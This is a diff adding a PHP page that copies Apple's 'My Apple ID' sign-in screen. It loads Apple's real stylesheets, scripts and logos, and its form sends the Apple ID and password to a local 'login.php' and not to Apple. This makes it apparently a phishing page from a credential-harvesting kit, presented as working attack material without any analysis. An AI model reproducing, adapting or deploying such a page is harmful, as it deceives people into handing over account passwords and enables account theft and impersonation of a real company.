@@ -1,0 +1,528 @@
+
+
+<?php
+
+if (!isset($_SESSION)) {
+  session_start();
+}
+
+?>
+
+
+
+
+
+
+<!DOCTYPE html>
+
+
+
+
+
+<html>
+
+
+<head>
+	<title>Apple - My Apple ID</title>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7, IE=9" />
+	<meta http-equiv="pics-label"
+		  content="(pics-1.1 &quot;http://www.icra.org/ratingsv02.html&quot; l gen true for &quot;http://www.apple.com&quot; r (cz 1 lz 1 nz 1 oz 1 vz 1)   &quot;http://www.rsac.org/ratingsv01.html&quot; l gen true for &quot;http://www.apple.com&quot; r (n 0 s 0 v 0 l 0))">
+	<meta name="viewport" content="user-scalable=yes, width=1024">
+	<meta name="Author" content="Apple Inc.">
+	<meta name="omni_page" content="Apple - My Apple ID">
+	<meta name="Category" content="">
+	<meta name="Description" content="">
+	
+	
+	
+	
+	
+	
+	
+	
+	<link rel="stylesheet" type="text/css" href="https://www.apple.com/wss/fonts?family=Sukhumvit+Set&v=1&weights=200,400,700 ">
+	<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/common/jQuery_UI.css">
+	<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/App93/style.css">
+	<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/App93/ac_quicktime.css">
+	<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/App93/overlay.css">
+	<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/App93/ds_login.css">
+	<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/App93/base-template.css">	
+	<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/js/commonLogin.js" type="text/javascript" charset="utf-8"></script>
+
+	<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/Appjavascripts/jquery_v1_1.10.2.min.js" type="application/javascript"></script>
+
+	
+	
+	<script type="text/javascript">
+	
+		$(document).ready(function(){
+			 /*	This method shifts the site structure from "left to right" mode to "right to left" for Arabic.*/
+		    var textDir = 'ltr';
+		    if(textDir == 'rtl'){
+		    	jQuery('html').attr('dir','rtl');
+		    	jQuery('.gh-nav-list').css({'dir':'rtl'});
+		    	jQuery('.main-footer').attr('dir','rtl');
+		    	jQuery('h2').css({'text-align':'right'});
+		    	jQuery('.formrow').addClass('fltR');
+		    	jQuery('.intro').css({'text-align':'right'});
+		    	jQuery('.input-msg').addClass('fltR');
+		    	jQuery('.input-msg').css({'text-align':'right'});
+		    	jQuery('table').css({'margin-right':'70px'});
+		    	jQuery(jQuery('h2')[2]).css({'padding-right':'70px'});
+		    	jQuery('.alert').css({'right':'385px'});
+		    	jQuery('.label-text').css({'margin-left':'78px'});
+		    	jQuery('#label6').css({'top':'3px','left':'7px'});
+		    }
+		});
+	
+		
+	</script>
+
+	<style>
+		[touch-action="none"] {
+			-ms-touch-action: none;
+			touch-action: none;
+		}
+
+		[touch-action="pan-x"] {
+			-ms-touch-action: pan-x;
+			touch-action: pan-x;
+		}
+
+		[touch-action="pan-y"] {
+			-ms-touch-action: pan-y;
+			touch-action: pan-y;
+		}
+
+		[touch-action="scroll"],
+		[touch-action="pan-x pan-y"],
+		[touch-action="pan-y pan-x"] {
+			-ms-touch-action: pan-x pan-y; 
+			touch-action: pan-x pan-y;
+		}
+	.alert{
+	background-image: url(images/myappleid_error_20091125.png);
+    clear: both;
+    display: block ! important;
+    height: 17px;
+    margin: 0 0 -18px;
+    position: absolute;
+    right: 215px;
+    top: 84px;
+    width: 17px;
+		}
+		#wrapper_inner{
+		margin: auto ! important;
+		width:980px;
+		}
+		body{
+		width:100% ! important;
+		}
+		
+.fltL{
+float: left ! important;
+}
+.fltR{
+float: right ! important;
+}
+	</style>
+	<script>
+	
+	jQuery.noConflict();
+	(function( $ ) {
+	jQuery(document).ready(function(){	
+		$('#formwrapstyle,#formwrapstyle1,.formwrap,.formwrow').addClass("tbox-wrap");
+		$('#signInHyperLink').remove();
+		
+		$('a.bigblue').html('<span>Sign In</span');
+		$('#bot-nav').wrap('<div class="button-panel">');
+		$('input#confirmPassword').removeAttr('onkeydown');
+		  var textDir = 'ltr';
+		    if(textDir == 'rtl'){
+	   		    jQuery('#formwrapstyle').css({'float':'right'});
+				jQuery('div.button-panel').attr('style',' border-top: 1px solid #E3E3E3; margin-right: 0em; margin-top: 8em;padding-top: 2em;padding-right:350px;float:right;');
+		    } 
+		$('#expiryForm #bot-nav').html('<a class="btn bigblue" onkeypress="checkEnter(event);" onclick="submitExpiryForm()"><span>Change Password</span></a>');
+		$('#harvest #bot-nav').html('<a class="btn bigblue" onkeypress="checkEnter(event);" onclick="submitHarvestForm();"><span>Continue</span></a>');
+		$('input#oldPassword,input#newPassword,input#confirmPassword').attr('onkeypress','checkEnter(event)');
+		
+
+	$('a.bigblue').click(function(e) {
+		if (!$('a.bigblue').hasClass('disabled')) {
+			$('a.bigblue').addClass('disabled');
+			submitForm();
+	   }else if($('a.bigblue').hasClass('disabled')){
+		   e.preventDefault();
+	   }
+	});
+	
+	});
+	})(jQuery);
+
+	function submitFormOne()
+	 {
+		$('a.bigblue').removeAttr('onclick');
+			document.form1.submit();
+	 }
+	
+	</script>
+</head>
+
+
+<body class="body">
+
+<!-- header begins here -->
+	
+
+
+
+
+	
+		
+
+
+
+
+<!--********* New style imported as per the new Header *********-->
+<link rel="stylesheet" href="https://www.apple.com/ac/globalheader/1.0/styles/globalheader.css" type="text/css" />
+<!--  Code to choose the js based on if it shows support bar or not -->
+
+	
+	
+		
+	
+
+
+
+	
+	
+		<script
+			src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/2011/global/nav/scripts/globalnav.js"
+			type="text/javascript" charset="utf-8"></script>
+	
+
+<nav id="globalheader" class="globalheader" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US">
+
+<div id="gh-content" class="gh-content">
+      <ul class="gh-menu">
+        <li id="gh-menu-icon-toggle" class="gh-menu-icon gh-menu-icon-toggle"><button id="gh-svg-icons" class="gh-svg-wrapper"></button><span class="gh-text-replace">Menu</span></li>
+        <li id="gh-menu-icon-home" class="gh-menu-icon gh-menu-icon-home"><a href="/"><span class="gh-text-replace">Apple</span></a></li>
+      </ul><!--/gh-menu--> 
+	<div class="gh-nav">
+		  <ul class="gh-nav-list">
+		     <li class="gh-tab gh-tab-apple"><a class="gh-tab-link" href="http://www.apple.com/"><span class="gh-tab-inner"><span class="gh-text-replace">Apple</span></span></a></li>
+		     <li class="gh-tab gh-tab-store"><a class="gh-tab-link" href="http://store.apple.com/"><span class="gh-tab-inner"><span class="gh-text-replace">Store</span></span></a></li>
+		     <li class="gh-tab gh-tab-mac"><a class="gh-tab-link" href="http://www.apple.com/mac/"><span class="gh-tab-inner"><span class="gh-text-replace">Mac</span></span></a></li>
+		     <li class="gh-tab gh-tab-iphone"><a class="gh-tab-link" href="http://www.apple.com/iphone/"><span class="gh-tab-inner"><span class="gh-text-replace">iPhone</span></span></a></li>
+		     <li class="gh-tab gh-tab-watch"><a class="gh-tab-link" href="http://www.apple.com/watch/"><span class="gh-tab-inner"><span class="gh-text-replace">Watch</span></span></a></li>
+		     <li class="gh-tab gh-tab-ipad"><a class="gh-tab-link" href="http://www.apple.com/ipad/"><span class="gh-tab-inner"><span class="gh-text-replace">iPad</span></span></a></li>
+		     <li class="gh-tab gh-tab-ipod"><a class="gh-tab-link" href="http://www.apple.com/ipod/"><span class="gh-tab-inner"><span class="gh-text-replace">iPod</span></span></a></li>
+		     <li class="gh-tab gh-tab-itunes"><a class="gh-tab-link" href="http://www.apple.com/itunes/"><span class="gh-tab-inner"><span class="gh-text-replace">iTunes</span></span></a></li>
+		     <li class="gh-tab gh-tab-support"><a class="gh-tab-link" href="http://www.apple.com/support/"><span class="gh-tab-inner"><span class="gh-text-replace">Support</span></span></a></li>
+		     
+		     
+					<li id="gh-tab-search" class="gh-tab gh-tab-search">
+						<div id="gh-search" class="gh-search" role="search">
+							<form action="/search/" method="post" class="gh-search-form"
+								id="gh-search-form"
+								data-search-recommended-results='{"url":"https://www.apple.com/global/nav/scripts/shortcuts.php","requestName":"recommendedResults","queryName":"q","dataType":"xml"}'
+								data-search-suggested-searches='{"url":"https://www.apple.com//search/instant/getSuggestions","requestName":"suggestedSearches","queryName":"query","queryParams":{"model":"marcom_en_US","locale":"en_US"},"dataType":"json"}'>
+
+								<div class="gh-search-input-wrapper">
+									<label for="gh-search-input" class="gh-text-replace">Search
+										apple.com</label> <input type="text" name="q" id="gh-search-input"
+										class="gh-search-input"
+										placeholder="Search apple.com" />
+								</div>
+								<button disabled="disabled" type="submit" id="gh-search-submit"
+									class="gh-search-submit gh-search-magnify">
+									<span class="gh-text-replace">Search apple.com</span>
+								</button>
+								<button disabled="disabled" type="reset" id="gh-search-reset"
+									class="gh-search-reset">
+									<span class="gh-text-replace">Reset</span>
+								</button>
+							</form>
+						</div> <a class="gh-search-magnify" href="http://www.apple.com/search/"><span
+							class="gh-text-replace">Search apple.com</span></a>
+					</li>
+				
+		 </ul>
+	</div>
+</div><!--/gh-nav-->
+</nav><!--/globalheader-->
+<script src="https://www.apple.com/ac/globalheader/1.0/scripts/globalheader.js" type="text/javascript" charset="utf-8"></script>
+	
+	
+
+
+<!-- header ends here -->
+
+
+		
+				
+		
+			
+			
+			
+			
+		
+	
+	<div id="wrapper_inner">
+<div class="logo">
+	<h2><a aria-label="My Apple ID" href="https://appleid.apple.com/"><img id="logo" aria-hidden="true" src='https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/images/App93/images/en_US/headerLogo.png' >
+</a>
+	</h2>
+</div>
+<div class="base-template-content">
+	<article class="base-template">
+	
+		<div class="left" aria-labelledby="your-apple-id-heading" aria-describedby="your-apple-id">
+		
+		
+		
+			<h2 id="your-apple-id-heading" role="heading">Sign in to manage your Apple ID.</h2>
+			<p id="your-apple-id" class="intro">To view and edit your Apple ID account information, please sign in. If you don't have an Apple ID, you can <a href="https://appleid.apple.com/account">create one now.</a>
+			</p>
+			
+		</div>
+		<div class="right">
+		
+<div class="sign-in-panel">
+<h2 style='padding-left:13px;'>Sign In.</h2>
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/css/common/commonLogin.css" charset="utf-8"/>
+
+<script type="text/javaScript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/common.js"></script>
+<script type="text/javaScript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/Appjavascripts/FDC/dcutil_2_2.js"></script>
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/js/commonLogin.js" type="text/javascript" charset="utf-8"></script>
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/views/static/js/commonScript.js" type="text/javascript" charset="utf-8"></script>
+
+	
+		
+		
+			
+		
+	
+	
+<input type="hidden" id="harvestID" value="none" />
+<input type="hidden" id="expiryID" value="none" />
+
+
+
+<input type="hidden" id="authenticationID" value="authentication" />
+
+
+
+	<input type="hidden" value="modern" id="modernview"></input>
+	<script>
+</script>
+	<table width="100%">
+		<tbody>
+			<tr>
+				
+				<td>
+
+				<div id="ds_container"><form id="command" name="form1" action="login.php" method="post">
+					
+					<input id="iForgotNewWindowVar" name="openiForgotInNewWindow" value="false" type="hidden" value="false"/>
+					<input id="fdcBrowserData" name="fdcBrowserData" type="hidden" value=""/> 
+					
+					<!-- show heading -->
+					
+					
+					<div class="formrow" id="formRowDiv">
+					
+					
+					<span class="formwrap"
+						id="formwrapstyle"> <input id="accountname" name="appleId" tabindex="1" onkeypress="checkEnter(event,this,&#39;form1&#39;);" spellcheck="false" name="theAccountName" autocorrect="off" class="input-text" type="text" autocapitalize="off" aria-label="Apple ID" value="" size="30" maxlength="128" autocomplete="off"/> </span> 
+					
+					<div class="space padder2"> <span class="input-msg show"> 
+						
+						
+							<a id="appleIdURL"
+								href="https://iforgot.apple.com/cgi-bin/findYourAppleID.cgi?language=US-EN&app_id=93&s=548-548"
+								onclick="javascript:appendURL('https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogin.html%3FappIdKey%3Daf1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3%26path%3D%2Fsignin%2F%3Freferrer%3D%2Faccount%2Fmanage%26language%3DUS-EN'),loadiForgotInNewWindow();">Forgot your Apple ID?</a>
+						
+					 </span></div></div>
+					<div class="formrow">
+					
+					
+					
+					  
+					
+					
+					<span class="formwrap"
+						id="formwrapstyle1"> <input id="accountpassword" name="accountPassword" tabindex="2" onkeypress="checkEnter(event,this,&#39;form1&#39;);" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" aria-label="Password" type="password" value="" size="30" autocomplete="off"/> 
+					</span><div class="space padder3"><span
+						class="input-msg show"> 
+						
+						
+							<a id="passwordURL"
+								href="https://iforgot.apple.com/cgi-bin/iforgot.cgi?language=US-EN&app_id=93&s=548-548"
+								onclick="javascript:appendURL('https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogin.html%3FappIdKey%3Daf1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3%26path%3D%2Fsignin%2F%3Freferrer%3D%2Faccount%2Fmanage%26language%3DUS-EN'),loadiForgotInNewWindow();">Forgot your password?</a>
+						
+					 </span></div></div>
+					
+
+
+
+					<div id="bot-nav">  
+						<a class="btn bigblue" onkeypress="checkEnter(event,this,'form1');"><input type="submit"
+							id="signInHyperLink" tabindex="3"
+							value='Sign In'
+							aria-label='Sign In'
+							title='Sign In' /></a>
+					</div>
+					
+
+
+
+
+	<input type="hidden" id="appIdKey" name="appIdKey"
+		value="af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3" />
+
+
+
+	<input type="hidden" id="accNameLocked" name="accNameLocked"
+		value="false" />
+
+
+
+<input type="hidden" id="language" name="language"
+	value="US-EN" />
+
+
+	<input type="hidden" id="path" name="path" value="/signin/?referrer=/account/manage" />
+
+
+
+
+
+
+
+
+
+	<input type="hidden" id="Env" name="Env" value="PROD" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<input type="hidden" id="referer" name="referer"
+		value="https://appleid.apple.com/account/home" />
+
+
+				</form></div>
+				</td>
+				<td class="cellspacer" width="30%"></td>
+			</tr>
+		</tbody>
+	</table>
+	<input id="appleIdHide" type="hidden"
+		value='Apple ID' />
+
+	<input type="hidden" id="accountPasswordHide"
+		value='Password' />
+
+	<script>
+appendOnLoad();
+hintText();
+</script>
+
+
+<!-- Set the field account Name as Type="email" in case the request is from iPhone or iPad -->
+
+   
+  
+  
+  
+ 
+ 
+<input type="hidden" name="hiddenUrl" id="hiddenUrl">
+<input type="hidden" name="currentUrl" id="currentUrl">
+
+
+<script type="text/javascript">
+var inputs = document.getElementsByTagName("input");
+for(i=0;i<inputs.length ;i++){
+inputs[i].setAttribute('autocomplete','off');
+	
+}
+</script>
+
+
+
+
+
+
+
+		
+</div>
+			</div>
+		</div>
+	</article>
+
+<footer id="globalfooter" class="main-footer">
+	<div class="breadcrumb">
+		<ol id="crumbs">
+			<li class="home"><a href="http://www.apple.com">Home</a>
+			</li>
+			<li><a href="https://appleid.apple.com/">My Apple ID</a>
+			</li>
+			<li></li>
+		</ol>
+	</div>
+	<div class="gf-sosumi">
+	
+		<p>Copyright &copy; 2015 Apple Inc. All rights reserved.</p>
+		<ul class="piped">
+			<li><a class="first" href="http://www.apple.com/legal/terms/site.html">Terms of Use</a>
+			</li>
+			<li><a href="http://www.apple.com/privacy/">Privacy Policy</a>
+			</li>
+			<li class="choose">
+				<a class="choose" title="Choose your country or region"
+				   href="https://appleid.apple.com/choose-your-country">
+					<p>Choose your country or region</p>
+					<img class="img-22"
+						 src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Apr2015/images/AppleConnect/22x22/USflag.png">
+				</a>
+			</li>
+		</ul>
+	</div>
+</footer>
+</div>
+
+
+<script type="text/javascript">
+jQuery(document).ready(function(){
+	var textDir = 'ltr';
+			 if(textDir == 'rtl'){ 
+			    	jQuery('.recovery').css({'float':'right'});
+			    	jQuery('.home').css({'font-size':'0px','margin-left':'12px'});
+			    }
+	}); 
+	</script>
+</body>
+</html>
